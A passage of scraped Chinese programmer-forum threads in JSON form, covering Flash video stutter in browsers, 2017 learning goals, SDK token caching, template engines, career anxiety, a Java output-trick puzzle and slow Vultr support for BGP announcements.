总时间不变", "乐视视频全屏的情况下看着看着就卡住不动了，不知道是神马鬼", "win7 64bit firefox 50 看腾讯视频超清会一卡一卡的,最终卡住不动。", "卡顿都是小问题了。 16 年 12 月~17 年 1 月， win10 上的 firefox 播放 flash 经常占满 cpu ， 关闭页面也不释放。", "之前也有过看腾讯 NBA 直播直接没画面的情况，能看也会间歇性抽搐，不知道是不是同样的原因", "那到底是啥问题导致的咧？", "iqiyi/mgtv 也偶尔全屏卡", " #6 \r", "重度体育爱好者 常年看 2 月份以前根本没处过这种问题", "自从 55 开始， chrome 浏览器自带 flash 看视频，经常卡顿和无响应。。。我以为是我电脑问题， win7 系统。\r", "\r", "每次需要完全退出 chrome 然后重新打开，看了不久又会出现这个情况", "chorme  好像我的更新到 55 以后, flash 都没了.........   害的 我还折腾了好大一会.....   linux 系统下的..\r", "\r", "不过发现  我打开新浪微博...   都开始是 H5 了.......  不是以前的 flash 了............ 不知道你们的是不是", "同楼主，用 Chrome 自带的资源管理器可以看到 shockwave 内存占比会越来越大，同求解\r", "Chrome 版本是 56.0.2924.87 (64-bit)", "chrome v55+/firefox 都禁用 flash 了， flash 漏洞太多又占内存，要退出历史舞台了。用第三方 flash 插件问题更是多多。", " #14 \r", "看来我从 ", " 下载了假的 chrome", "微博页面常开，最近两个月无数次看到“ shockwave 已崩溃”，就算不崩溃，微博页面也卡得要死", "所以现在我 Chrome 感觉卡的话就把微博关掉 （无奈~）\r", "不能用 H5 播放器的视频站，如果看到一半开始卡，要去手动结束一下 Shockwave Flash 才行", "WIN10+CHROME,视频基本上都会出现很明显的接缝卡顿.有的甚至会出现循环播放接缝前几秒..\r", "原来是 flash 的锅", "现在好多点播的视频也是 m3u8 的了  干脆直接搭了 HLS Agent 本地播放  能加 FRC  能实时录制 很省心", "斗鱼，熊猫 都没法看，见鬼了", "关闭硬件加速试试", " #21 \r", "发现问题时候就试过了，更卡了……", " 哦，可以看下卡顿的时候 fps 有没有明显降低", "Mac 上 Chrome 看直播各种 CPU 占用 100%", "卤煮用 EDGE 试下，如果 EDGE 没问题又不想用 EDGE 的话可以换 Firefox", " #25 \r", "对换浏览器没兴趣", " 熊猫有 h5 公测了，右击直播画面切换就好", " 那就没办法了， Chrome 的 Flash 一直对硬件加速支持有问题", "不只是直播\r", "a 站的视频也是", " #28 \r", "现在讨论的并不是硬件加速的问题\r", "是某个时间点以后 原来好使变不好使了\r", "而且我也不是 mac 平台这种 cpu 弱鸡没法抗软解的情况", "试试降级 chrome 吧"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>1.<a href=\"http://blog.csdn.net/mindfloating/article/details/54883818\" rel=\"nofollow\">论边度计划的可行性</a></p>\n<p>2.凡事从 0 分做到 50 分，靠的是直觉和经验；从 50 分到 90 分，就要靠技艺了。很赞同这句话</p>\n<p>3.学会什么</p>\n<p>4.了解什么</p>\n<p>5.楼主正啃日语中。。。</p>\n</div></div>"], "reply": "158", "tittle": "伟大的程序员们，开工了你给自己定了那些 17 年的目标，比如学好什么。。。", "comment": ["看完各位的目标期望，我在考虑平时要不要看一些其他类型的书，关注经济，但平时都太忙（都是借口），哈哈", "同楼主，我也在学日语", "现在真是一堆要学机器学习的，那么问题来了， ML 真的适合本科生来搞吗，貌似招聘看到的都是要求至少硕士学位", "大概是，学做菜吧", " 本科生也不会永远本科的", "我也想学日语啊。。\r", "17 年估计没太多时间学吧= =", " 读个硕士不就得了。。去腐国读个一年的或者坡国读个两年的", " @", " \r", "\r", "AWS 可以一起聊聊", "从 90 到 100 靠运气。", "赚钱、技能提升、完成台东 703", " @", " 已经不再年轻了（国内貌似年龄大了导师都不一定要），随着年龄增长顾虑也多了，考在职感觉又没啥价值，死贵还学不到东西，除非是公务员。所以大家要乘年轻敢于多去尝试。", "1 ，跨城骑行；\r", "2 ，个人工作能力有实质性提升；\r", "3 ，每 2 周一篇博客；\r", "4 ，找女朋友；\r", "5 ，注意个人形象，学会搭配；\r", "6 ，把 kindle 里面买过的书都看完；\r", "7 ，去一趟国外旅游", "1. 准备托福和 GRE\r", "2. 找到一份好的实习\r", "3. 增重（捂脸逃", " 新东西诞生的时间轴可不是以你年轻不年轻为依据的。", " 除了日语之外，其他东西都是两个月能搞定的吧。。你这效率也是醉了。。", "1.服务器开发转机器学习\r", "2.买房\r", "3.脱单\r", "4.坚持运动\r", "5.看一些其他方面的书（每天看编程方面的累觉不爱。。。）", "1.看产品大佬的书\r", "2.学会用 PS 画图\r", "3.减脂\r", "4.完成自己每天的小计划", " 请问下这个效果跟自己看书哪个好？", "找到女朋友，换个能正常发工资的公司", "换个离家近的工作", " 女汉子", "继续学 lua ，应用到更多的实际项目中", "1 、把自己的小网站上线\r", "2 、学习线性代数、 AI 入门\r", "今年工作上主要这 2 个目标，争取完成", " B 站晚上见。。\r", " 那得多好的运气\r", " 666", " 刚刚看完斯坦福极简经济学", "   说说读后感呗借鉴一下", "* 🏊\r", "* 数据挖掘\r", "* 机器学习\r", "* Rust\r", "* Golang\r", "* 数据驱动一堆库\r", "* 定制一波系统\r", "* 日语", "找个妹子", "  生活活生生把一个妹子逼成了汉子😓", " 报班和自己看书主要区别在于花了钱，你不学就觉得亏了", " 在 B 站看过几个教学视频。有空就拿新标日来听录音学。但最近业余时间少了也就没怎么动。", " 我昨晚睡觉前迷迷糊糊的，脑子里有个想法。 就是造一个机器人模拟自己。 比如会把我自己的记忆能录进去的都录进去。 把自己能想到的一些反应也录进去，比如阴天就不开心，爱吃啥。一生一直去完善。 等到真的挂了，放在墓碑上。。。哈哈哈，还可以与别人简单的交流。。。", " 每天坚持一小时，五十音刚学完。该语法了", " 噘嘴的头像好评", " 五十音我能唱出来 :)  \r", "工作原因，我每天还真是抽不出一小时啦。楼主要好好加油啊", " 头像挺好", " (⊙o⊙)…", "读 12-24 本书。无论技术的还是金融的，非娱乐即可。目前已完成 6 本。目标增重 30 斤，目前完成 10 斤。加强大腿、胸部、腹部肌肉，目前完成胸部", "1. JS\r", "2. C#\r", "3. 啃英文书\r", "4. 开始写 Blog\r", "5. 减肉\r", "6. 日语已学 ^^", "上半年：\r", "《 C 程序设计语言》\r", "《 Unix 高级环境编程》", "赚 100w", "为什么个个都在学日语？有学西班牙语的上车啊~~~", "每天时间满满的，不加班就万幸了，哪还有时间精力搞这搞那", "q5 = =！", " 😅", " 是机器学习相关专业的么。。。不是的话。。。先去看数学吧。。。 btw 。。。拳皇如果做 AI 算是非常复杂的 AI 了，目前也就看过 DL 做之前那个一上一下小鸟游戏的 demo ，类似于拳皇，或者 AlphaGO 。。。先配置好机器再说。。", " 是啊，理想丰满显示骨干！", "1 、摆脱抑郁症\r", "2 、……", " 然后盗墓者来了，你墓说别偷我，隔壁有钱。隔壁说，我后面老王墓里钱多，老王说，别听他们瞎说。 2333333", " 膜拜大神，我的目标还在年入 25 万，呜呜呜", " 666 ，学日语的要不要上车\r", " 2333\r", " 理想很丰满，现实很残酷啊， 2333\r", " 欢迎上车\r", " 时间就是海绵里的水，挤挤总是有的\r", " 学霸才有的。。。\r", " ?", "定个小目标，比如先赚一个亿", "1.首先是把毕设好好解决\r", "2.然后是好好学习 Java ，找到一份更好的工作\r", "3.健身\r", "4.学英语", "目前先滚去把科技论文翻译完 /(ㄒoㄒ)/", "吃 366*3 顿饭，睡 366 顿觉", "学法语的感觉没啥人了", "1. 找女朋友\r", "2. 攒钱，为结婚准备\r", "3. 加薪\r", "4. 学 golang"]},
{"content": ["<div class=\"topic_content\">Token 往往有有效期，请求 Token 时也会有调用次数的限制。\r<br>那么 Token 的缓存应该是由 SDK 来实现还是用户的系统自行实现。 SDK 只提供 Token 的计算方法？\r<br>\r<br>大家如何考虑这部分？</div>"], "reply": "5", "tittle": "如果做 SDK，需要考虑 Token 的缓存么？", "comment": ["不用考虑，让用户自己实现。", "通常都是客户端自己缓存 Token,服务端 Token 有时效性,定时或者自己搞个缓存定时清理.", "活捉一只", "  ", "  \r", " 谢谢\r", " 谢谢", "考虑 token 的过期就行了。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>有没有 V 友能给外行解释一下什么叫做模版引擎？</p>\n<p>找了一些资料：</p>\n<p>比如 Thymeleaf 这个不知道该怎么称呼的东西（有的叫框架，有的叫模版引擎，有的直接叫做“库”）</p>\n<p>进官网看了看， Thymeleafis a modern server-side Java template engine for both web and standalone environments</p>\n<p>找到个关键字 “服务端模版引擎”</p>\n<p>继续搜索一下，发现还有前端模版引擎和后端模版引擎一说</p>\n<p>当面问了一个 java 开发人员也没能讲清楚模版引擎是个什么东西，有哪些关键的作用和特性</p>\n<p>希望 V 友能够指点一下</p>\n</div></div>", "<div class=\"topic_content\">再次谢谢各位！</div>"], "reply": "20", "tittle": "关于模版引擎", "comment": ["后端模板比如我用的 uliweb 可以在 html 里嵌入 python 代码: ", " ,这样动态的网页就比较好实现了 当然这个在最好的语言本来就有了, 后端模板的执行是在服务端完成的\r", "\r", "前端模板比如我用的 avalonjs 可以在 html 里用专门定义的指令组件等等来达到运行时的动态执行: ", " ,前端模板的执行是在浏览器端完成的", "就是本来你要生成一个网页，需要自己去拼装，很不好用。\r", "\r", "模板引擎可以帮助你快速生成网页，比如你要在网页上生成一个列表，以前要自己写循环，然后把这些 HTML 的源码拼起来，现在只要把这个列表放到模板引擎里面就可以，提升了开发效率，代码也变得整洁了。\r", "\r", "不过我还是认为前后端纯粹的分离才是正道（逃", " 谢谢啊，没做过这方面的开发，没什么具体概念，你说的属于具体实例了，有点难度😄。。\r", "能不能这么理解：模版这个东西是用来实现 MVC 三层的分离的，将 View 的数据更新操作所需的数据全部打包，在后端 java 代码中通过模版指定的语法将前面打包的各个数据与 java 中的数据对象绑定的一种快捷操作？", "模版引擎就是把数据填充到一个大字符串中的指定位置，可以做一些简单的逻辑操作（ if ， foreach 等）。\r", "\r", "前端和后端模版引擎的区别就是：做填充数据、逻辑操作的这一步是在前端还是后端完成的。\r", "\r", "\r", "\r", "给你一个最好的语言的模版引擎，我觉得它思路清晰。", "  这个例子不错，有点概念了。有前端模版引擎和后端模版殷勤一说吗？你说的是属于哪一种？", " 模板引擎就是生成动态页面的一个方法,后端语言可以从后端(如数据库)获取到状态,所以可以由后端语言生成 html,但完全靠后端语言自己拼 html 太麻烦,就搞个模板引擎,这样在 html 里可以直接调用后端语言生成部分 html,其他固定的 html 就直接在模板文件里写死\r", "\r", "前端模板也是类似,它的状态可以在 javascript 里存放,也可以由 javascript 调用后端 api 获得,此时也有同样的问题,完全由前端 js 生成 html 是可行的,但是太麻烦不好维护,所以又搞出了前端模板", "> 有没有 V 友能给外行解释一下什么叫做模版引擎？\r", "\r", "模板引擎指的是一种根据特殊语法或者模式（ Pattern ），通过预设规则生成内容的转换程序。\r", "\r", "比如 Thymeleaf 是一种使用 Java 编写的 HTML 模板引擎。它可以解析并处理 HTML 中的代码，并通过这些代码来调用 Java 中的预设函数或数据来产生新的 HTML 内容。", " 大概清楚是个什么东西了，非常感谢。", "举个例子讲讲我个人的理解。\r", "\r", "比如说，你看到的网页，其实就是一个很大的<html>xxxxx</html>文档。只要有了这个文档，浏览器就能显示页面。在以前网站都是静态的时候，服务器都直接把这个写好的 html 发给你。后来，网站复杂了，大家发现一个页面一个 html 不行，太累了，而且很多页面其实主要部分是一样的，中间有一些不一样。结果大家想出来的方法就是用代码生成，比如 html = '<html>' + customer+'</html>'。根据 customer 的不同，可以生成不同的 html 。\r", "\r", "再后来，发现这么写代码拼出来还是太麻烦了，而且控制逻辑跟负责显示的 html 耦合很严重，就发明了模板引擎。我定义个模板，比如长这样：<html>{customer}</html>。其中{customer}也是个变量。当然，这个模板可以很长，很复杂，带很多变量。我现在要做的，就是告诉模板引擎我想用哪个模板，其中变量的值分别是多少，它就可以自动给我生成 html 了。这里，模板只负责展示，你的代码可以通过各种逻辑获得变量的值，让模板引擎去渲染，就解耦了。\r", "\r", "前后端模板引擎，对我来说，就是服务器渲染出 html 直接返回给浏览器，还是服务器传值回来，由前端的 js 生成 html 的区别吧。", " 噢，那么使用 Thymeleaf 模版引擎的项目，只会前端的人想根据新的设计图重新写一下前端 UI 能搞定吗？\r", "就是完全不会 java 代码的， eclipse 都不会用，打开工程啥都看不懂的，更不能写业务逻辑的前端人员能直接只修改 UI 吗？😓💦", " 可以的", "  噢😯？ 直接修改 tomcat 服务器上的 www 文件夹下面的 html 源码中的样式就行了嘛？", " 后端模板引擎的话就是在后端把网页生成好了然后再发给前端；前端模板引擎就是后端只发数据，前端使用 JS 把获取到的数据渲染在页面上，就酱~", " 在前面的讨论基础上，你这个总结显得异常地简洁明了！😄", " \r", "\r", "短答案：是的。事实上这就是模板引擎存在的意义——让前端不需要担心后端那些复杂的逻辑，只需要处理手头上这些后端给到的数据就行了。这样前端的工作负担就能大大减轻了。\r", "\r", "长答案：这需要看你如何安排你的项目，以及新的设计是否引入了需要后端一起变更的功能。\r", "\r", "我没有用过这个模板引擎，但我看了下它的文档，感觉跟大多数模板引擎套路一致：分配或者映射一个变量，把它交给模板引擎，模板引擎根据模板语法解析出那个变量，将变量（或变量解析后的）内容填充到页面上。\r", "\r", "你看，模板引擎得到的变量都是后端给的，前端自己不能“得到”这些东西。所以如果你的前端需要得到这些数据，就需要后端将数据“给”前端（虽然在实际意义上是同一个程序）。\r", "\r", "但是如果前端的变更无需调用新的数据，那么大体上就不需要后端参与 UI 更新了。", " 逻辑清晰，语句通顺，哈哈。感谢🙏", "数据+模版->带格式的数据\r", "模版引擎就是做转换的那一步。", "简单点：就跟 ppt 模版一样，在模版上加上自定义的数据或文字内容等。\r", "\r", "我比较喜欢用 freemark", " 之前看 JD 某大神分享的文章，有提到他们在 JD 商品页面大量使用了模板引擎，为了让前端更快速的响应加载。 JD 这种体量的系统，也用模板引擎，是不是代表绝对的前后端分离也只是理想化的？", " 事实上这种电商网站由于活动特别多，所以一般反而会大量使用前后端分离。不考虑京东的主站，京东在一些小型的活动页面上经常会使用纯粹的前后端分离策略，因为这样一来后端只需要提供接口，相对变化较小，而前端则可以非常灵活。总之还是一句话：根据需求而定自己使用什么样的策略。"]},
{"content": ["<div class=\"topic_content\">国内 Top N 大学毕业，一直在小但知名的公司工作（两家），也算独立负责了很多业务（注册用户亿 /千万级，日活百万级），大部分时间是后端（两家用的语言不一样），因 iOS 缺人临时给 iOS 干过几个月，也曾给一个新成立的部门（唯一的技术）前后端都做了大半年。\r<br>在哪都被夸聪明。在新东家半年拿了 A 的绩效，但是自己就感觉心里的焦虑从来没有减轻过，从老东家离职的时候甚至一度怀疑能不能找到工作（囧）。\r<br>一个感觉是做业务需求的话，也就这样了：不需要对技术理解很深，能满足用户需求就行。我自己也不是很努力，自驱力一般，不求甚解为多，够用就行，导致基础很不扎实。举个最简单的例子：自己给自己模拟面试让系统多进程多线程编程，我就说不出个所以然来。\r<br>另一个感觉是没有代表作。没造过轮子也没开发过多牛逼的技术。\r<br>\r<br>现在迷茫的很。有朋友有同感吗？</div>"], "reply": "85", "tittle": "工作三年半，还是感觉自己好水", "comment": ["有，纯粹是看文档，面象需求编码。。感觉能力没有质的提高", "我也是一样，感觉是面向业务需求编程。没有深入的理解。", "多看一些原理方面的书吧，然后看这些书的作者提到的或者推荐的书，看多了有时候看到文档就能知道这个是怎么做的了。甚至可以不看文档，直接去看代码。 csapp ， sicp ， http 方面的， tcpip ，算法，人工智能，都去看看，不用管有用没用，当休闲了。", "加我一个", "加一", "加一", "迷茫+1", "我等面向工资编程的都不会有这种烦恼", "这种感触其实大家都有，可能像我这样缺钱的还会觉得钱少想努力赚钱啥的，但是目前其实也没什么好的办法，只能想想办法造轮子提升自己的能力", "同感，整天写业务 干的工种广，多（前后端，运维都干），但深度不够，基本上用不到很复杂的东西。所以现在上班路上还自己复习下算法和数据结构什么的，想学一门较为擅长多线程的语言，最近看上了 go ，想在公司的项目上部分业务用上它来处理多用户的请求或加快数据处理速度", "+1 入职半年 目前还是业务驱动开发，什么东西都能写 但是都是浅尝辄止 没有深入", "建议看看底层知识，看框架源码及分析。\r", "假如不知道如何写多线程才是高效，那还不及格。", "就读 top n+10086 ，可能加多个零。刚学这门课没多久，入这行喜欢的就是探索的过程和完成一个目标高潮般的快感。感觉楼主可能失去了刚开始的热情吧，可能是我还没完全踏入社会不能理解。正所谓人比人。迷茫可能就是因为闲着吧。", "现在工作环境变化迅速，岗位就是要求 T 型人格，上面一横表示你的知识面足够宽，什么都懂一点的万金油，下面一竖表示你要有起码有一个方面是足够深入的。\r", "\r", "所以不必要太担心是不是过于博而不精，工作环境就是这样，没有机会给你花五年研究一个东西。", "我毕业工作时候，我父亲对我说的一段话一直铭记在心:当你觉得你很懂的时候其实你狗屁不通。当你觉得自己什么都不懂的时候你才真正开始懂了。", "迷茫的时候多看书，解开了迷惑也就获得了进步。", "+1 ，深深的焦虑", "我和楼主差不多，\r", "不过这根本不是迷茫...\r", "\r", "这 TM 就是懒好吗？\r", "这 TM 就是懒好吗？\r", "这 TM 就是懒好吗？\r", "\r", "感觉技术不深入就去深入呗。\r", "感觉基础不扎实就去扎实呗。\r", "感觉没做过轮子就去做个呗。\r", "\r", "不知道自己的问题叫迷茫。\r", "知道自己问题不去改就叫懒。\r", "\r", "不懒了，充实了，哪还有时间考虑这些有的没的。\r", "\r", "推荐两个治疗懒病的方法， [跳出 comfort zone] 和 [学做 target list] 。\r", "\r", "PS ：我已放弃治疗。", " 看到最后一句，噗...", "一个好的平台很重要呀，同迷茫中，每天跑步看书麻痹自己", " 想到了代码里写 Todo 的梗…", "me too\r", "\r", "缺好平台！", "道理都懂，就是懒。。", "先给自己定个小目标，比如去大厂见识更广阔的世界，或者下一份工作混成一个 小 leader 。技术方面嘛，肯定要深入下去，但是不一定非要从哪里开始学，具体的知识其实找工作的时候是看缘分的，但你做过的系统你肯定要把他想明白。可以思考一下如果你们的业务日活乘以 10 的话，你们的系统能不能满足，往这些方面去思考呗。\r", "有一个提升动力的好办法，想想你下一份工作就带了一个 10 人的团队，你如何开展工作，你需要哪些知识储备，你小弟问你问题的时候你告诉他，我也不懂吗。", "+1", "想起个笑话， top2 有两所， top3 有 5 所， topn ，咳咳， 2n 所吧。。。", "大牛总是少数了，如果几年内没成为大牛，基本就那样子了", "懂业务很重要，你能够准确知道用户的需求，并且能够准确的完成需求，那就非常牛逼了。就怕一知半解。", "一种技术人偏向应用。\r", "另一种技术人偏向研发。\r", "\r", "我想楼主应该就是第一类人了，懂但是深度却不够，能说会写但有时候却有感无力，所以才会出现这种技术上的忧虑的，其实就是走的路不一样而已。未来发展的方向也不同了。", "我只知道有 top2 ，其它都是扯淡。", "+1", "大家都有这种感觉 你不是一个人在迷茫 不要怕 大家一起扯扯淡 聊聊  ", " ", "总结就是一句话：没事多看书", "最烦这种叨逼叨的。你们的典型套路是：遇到不懂问题 - 去看书 自学 - 肤浅理解 /能满足工作需求 - 突然看见大牛的光辉 - 心里发虚就是楼主这种 - 再去看书 发现已经自学不下去了。\r", "哇靠按照这种套路，心里不发虚才怪", "我也是这样，正在努力啃书", "+1 ，工作了五年半依然迷茫，面试给的评价：接触的东西比较多，但不深；感觉很到位！", "+1 不知道怎么办才好", " 哈哈，我也是。。。", "懒是一方面，但这么多知识点，得花多少精力去深入了解，时常感觉脑力不够", "我也是这样，正在努力看原理方面的书而不是整天粘贴复制代码，还算有点收获吧。最近网络方面看的比较多，打算造一个 tomcat 轮子，不知道何时能完工", "迷茫得不知道怎么回复 默默+1", "一样啊，我觉得问题就是工作里的确解决了不少问题，但是回头就忘了", "最近正在看一本比较冷门的书 收获很大。。", "感觉 lz 已经很 nb 了。。。大学好，工作也很不错， kpi 各种 a 。。。被同事各种夸聪明。。。\r", "注册用户亿 /千万级，日活百万级\r", "\r", "感觉已经很 nb 了。。。", "我觉得你欠缺的是与人沟通的能力而不是技术水平。一个真正的技术大牛。往往是不受管理层赏识的。人总要融入社会的，不是吗？", "感觉 lz 已经很 nb 了。。", "\r", "+1  楼主拉个微信群 大家一起交流吧", "为何要成为大牛？", "target list 很重要。。。", "跟我一样，工作能很好完成，评优得 A ，对于自己掌握的知识说不出所以然来。但是我不怕找不到工作，只是没有优势找到更好的工作", "尝试转管理吧，代码已经阻止不了你了。", "+1", "这个帖子我好奇的就是 topN 中 N 是几…… 哈哈。", "以前面试的时候问我，你做过最难的东西是什么，我说不出来....", "你问下你自己：\r", "你现在快乐吗？\r", "你想追求什么？\r", "想要就去做做试试", "专职写了两年代码了，也时常有类似的焦虑...分享下自己的应对（主要是前端方向）：\r", "通过 debug 学源码：直接看框架源码不知道从哪入手？那就给框架打断点来 debug ，并把结果尝试写出来 [范例: ]( ", ")\r", "通过看书造轮子：听说造轮子是自我提高的好途径，但自己知识不够造不来怎么办？那就找那种教你造轮子的书学着造，[范例: 重写 AngularJS]( ", ")", "+1.\r", "总感觉学不完学不精---前端", "人生又不是只有写代码。\r", "我又要看小说\r", "还要每天学外语\r", "还喜欢写点小文章\r", "没事旅游\r", "自然花在代码上的时间就少啦。\r", "不一定非要成大牛。", "同样活在焦虑。毕竟现在技术更新太快了。有时候总感觉跟不上节奏", "+10010", "身边的环境，对自己的认知很重要。\r", "\r", "楼主的工作决定了你得适应快速的变化，对技术的把握仅限于“够用就好”。同时你有危机感，对技术又有追求，结果就是自己矛盾+难过。这点我也几乎是一样。工作挺忙，干的事情不少，什么都要懂，哪里都需要救火。\r", "\r", "留给自己的时间太少，刚上班的时候还能沉下心来琢磨一些和工作距离很远的事情，慢慢也因为工作全部挤压掉了。\r", "\r", "因为一些契机和无奈，去年狠下心辞了职，跑出国念书，期望自己能够换一个环境，换一个角度，多关心一些自己希望关心的事情。目前看似乎进展还行。\r", "\r", "很多时候不是你不行，环境逼人的时候，结果可好可坏。跳出环境，可能是不得不做的选择。", "10 几年了，还是感觉特别水", "好平台确实重要，不然一年只有那么几天提升特别快，因为有事做。其他时候公司都没屁事，还想靠工作提升就做白日梦了……", "工作也好几年了，真的觉得自己啥都不懂。", "我要给自己加个 国内 Bottom N 大学毕业...\r", "另外自己也毕业六七年了，感觉越来越水了...", "跟楼主情况完全一样，换了工作刚入职半年，每个季度都拿 A ，但是觉得自己技术很水。。。", "+1 ，自己知道问题出在哪里，也想去改变。可惜懒癌过重，只停留在‘想’改变的阶段，然后就放弃治疗了....", "焦虑+1...", "面向业务编程的我也有这个感觉~", "+1", "照楼主这样说，感觉自己屎都不是。", " 这句话道出了我的心声\r", "\r", "\r", "我又要谈恋爱\r", "又要哄媳妇\r", "又要看电影\r", "\r", "不第一定要成为大牛", "工作 7 年了一直是这样的状态飘过", "工作三年，跟楼主一样的感受。在一家知名的创业公司，前后端都写的 Java 程序猿，业务驱动型的代码，写到第二年的时候就已经心里发虚了，想改变现在这种状态", "+1 最近也是这种状态，焦虑", "本来工作就是这样，百分之九十的都是重复别人的业务，想提升还得靠自己", "一直在焦虑，一直在学，就感觉都在表面打哈哈，进不去，要学的东西太多了，总感觉只会一门技术会饿死人的", "越俎代庖建了一个微信群，感兴趣的朋友可以加进来交流交流……\r", "![群]( ", ")\r", "\r", "不知道有没有违反站规，请谅解……", "同上，捂脸.....", "想必不是专业内的？\r", "\r", "平时遇到问题要多想，有没有更好的办法\r", "“好”可以是多样的，性能高是一种，可维护是一种，易扩展又是一种。慢慢的你看到别人精妙的解法就会很爽。\r", "hacker news 这类技术论坛可以逛逛，比如： ", " 和 ", " 。严格来说这都是奇技淫巧，不建议日常使用。但是看懂他们并觉得妙趣所在，说明你已经有深层次的了解。\r", "\r", "关于你说多线程多进程讲不清的，可以看看 ", " 讲的还行。最近我也在看，查漏补缺。", "+1", "多线程 多进程 线程没有自身上下文。何况现在多进程也是写时拷贝 跟线程并发性能差别不是很大了", " 思路很好啊，围观了 github ，好棒！", "我已经不记得当初手写七层循环来做图像信号相位去包裹的原理是什么了，但这有什么关系呢", "mark", "楼主的学校确实很赞"]},
{"content": ["<div class=\"topic_content\"><a target=\"_blank\" href=\"/i/H7IW12S4l.png\" title=\"在新窗口打开图片 H7IW12S4l.png\"><img src=\"//i.v2ex.co/H7IW12S4l.png\" class=\"embedded_image\"></a></div>", "<div class=\"topic_content\">#1 是正解。但是只是方法其一。还有一种可以使 println 也顺理成章而不在 method 中直接结束程序的办法。看看各位还有没有其它路能走。</div>"], "reply": "21", "tittle": "看到的一个题，随手分享一下", "comment": ["static void method(int a,int b){\r", "\t\tSystem.out.println(\"a=100,b=200\");\r", "\t\t//throw new NullPointerException();\r", "\t\tSystem.exit(0);\r", "\t}", "楼上的 66666....", "楼上的 66666....", "等待其他解答", "楼上的 666", " exit 哈哈哈", "跟你们说吧，只有 1 楼的答案是对的，因为后面那两个它么是的 println （笑哭", " 不不不，还可以换成  while(true);   ( ˙-˙ )", "楼上的 66666....", " 哈哈哈，大兄弟是的。", "套路。。。", "1 楼真是简单粗暴", "自古一楼出奇迹，看来没错啊！膜拜一楼。", "正常的话是 a\r", "b", "第二种方法是啥 第一种我也想到了...", "似乎可以覆盖 system.out.println 然后 replace?", "长知识，帮补代码：\r", "    public static void method(int a, int b) {\r", "        System.setOut(new PrintStream(System.out) {\r", "            @", "\r", "            public void println(String s) {\r", "                super.println(s.equals(\"a=10\") ? \"a=100\" : \"b=200\");\r", "            }\r", "        });\r", "    }", "在 method 中打印结果后，将 stdout 重定向到 stderr", " 应该是 super.print(s.equals(\"a=10\") ? \"a=100,\" : \"b=200\");", "```\r", "    public static void method(int a, int b){\r", "        final PrintStream oldOut = System.out;\r", "        PrintStream ps=new PrintStream(new FilterOutputStream(oldOut) {\r", "            boolean meetOne = false;\r", "            @", "\r", "            public void write(int b) throws IOException {\r", "                if( b =='0'){\r", "                    oldOut.write('0');\r", "                    oldOut.write(b);\r", "                }\r", "                else if(b == '1'){\r", "                    if(!meetOne){\r", "                        meetOne = true;\r", "                        oldOut.write(b);\r", "                    }\r", "                    else {\r", "                        oldOut.write('2');\r", "                    }\r", "                }\r", "                else {\r", "                    oldOut.write(b);\r", "                }\r", "            }\r", "        });\r", "        System.setOut(ps);\r", "    }\r", "```"]},
{"content": ["<div class=\"topic_content\">需要在 Vultr 宣告一个 /22 ，给了 Vultr LOA 和 ASN 之后等了足足 2 天才回复我说设置完成可以自行宣告。。\r<br>然后在后台发现这个 ASN 都给我写错，继续回复工单又等了 9 个小时没回复，只好再发一封，十五分钟后悔回了一次。后来需要 Vultr 通过一个段，又是等了 8 小时，才回了一句。。前前后后已经花了大概 3 天，什么事情都没办成，这效率真的是慢</div>", "<div class=\"topic_content\">哈，我突然想起来 OVH 了 四个月前提的工单 不但没回复还把我的工单给删了 &gt; &lt;</div>"], "reply": "98", "tittle": "终于体验到国外客服的效率了，比阿里云都要夸张", "comment": ["想必楼主一定没用过 steam🌝 客服处理都是按月算的", "中国效率很高了，而且慢的时候还可以投诉，还可以骂人**娘", "试试 linode ，效率吓死你", "别人客服下班早，国内基本两班至", "笼统地说， aws 也慢，那是因为， 1.文档比较全，一般都能在文档里找到答案或定位问题； 2.工单是有优先级的，优先级低的工单回复是较慢的。 3.没有沟通好，这个应该主要是你的原因。", "怎么说呢，这就跟快递一样。。你别想那么快，在国外。。\r", "或者你想想最近网上转弯弯的图，交了钱 30 分钟复机赞效率高。。。放国内早投诉到上级去了。。。", " AWS 慢是因为有付费版本的客服 ", "ramnode 这家，响应超快。用很久了。", "说到服务，国内真是好呀，看看美亚的快递，在美国 3-4 天才到很正常", "版瓦工后台提过几次工单，都是在 7 小时内回复~~~", "有可能有时差的", " 我在他回我后 5 秒就回复他了。。。", "vultr 快也没用额，运营商 24 小时刷新一次前缀", " \r", " 又不给玩 BGP~~", " linode 几年前是很快的，基本可以做到 24 小时不超过 15 分钟回复。但是自从 linode 推出每月 100 刀的所谓“服务”后，就变了，免费的客服，甚至可以到 12 个小时才回复一句。", "你为什么没有 route object?\r", "怎么拿到的 /22....", "表示感觉 Vultr 水单还是蛮 6 …", " vultr 回我都是模板套路，我发了什么他都没看，然后把上面的话再复制一遍给他终于开始处理了", "首先，你先看看时区是不是刚好在别人的下班时间……要等他上班之后才会回复的。隔 8 、 9 个小时是正常的。\r", "而且洋大人的客服很屌的，很有个性。", "BGP filter 一般都是一天才更新一次的....这个如果即时更新, 服务真是相当的好了...", "do 我每次工单都是 8 小时+才回复", " 这东西 RIPE 区域才要， Vultr 只要 LOA ，虽然个人觉得自己给自己开 LOA 是最蠢的事情，也没有什么数字签名认证", " 不… 我是秒回他", " 关键是他把我 ASN 写错了。。。我机器上压根没法用自己的 ASN 号，这个必须要和 Vultr 讲才能修，然后一等就是一天多", " 据说 Steam 客服才五十号人，这速度可以了", " 宣告是我自己做，但必须上游能接受我这个 ASN ，但是这个 ASN 在 Vultr 那边写错了😢", "你不知道有时差吗？", " 我是秒回他的，然后等 9 个小时", "要是海淘丢了东西之类的 你就能体验到国外快递和国外客服的双重服务 🙃", " 直接丢给 Paypal 解决不行么", "楼主脸黑，我在 vultr 上的工单最快 3 分钟回复，最慢 2 小时 41 分钟回复，平均 10 分钟内得到回复。", " 应该是我的问题普通的工程师无法回复", "买的香港 8 刀一季度 的 vps 感觉客服效率还不错", "vultr 工单一般处理都很快。可能楼主遇到假客服吧。", "我在英国， 用的就是 VULTR ，  非常好。 每次都是 5 分钟内回的。一点不夸张", " 我也想说搬瓦工还算比较快的", "有个疑问:外国的人工服务成本是不是比较高，所以招的客服少？招的少没有竞争所以效率不高。", "外国无论是 IT 行业还是传统行业 客服都这样\r", "基本以天为单位交流 所以我每次发邮件都要自己检查疏漏 把能写的都写上", " +1", "中国人工便宜", "正在用免费一年的 AWS ，之前不知道只能用 2 台免费服务器，导致出了十几刀的账单，打电话给 AWS 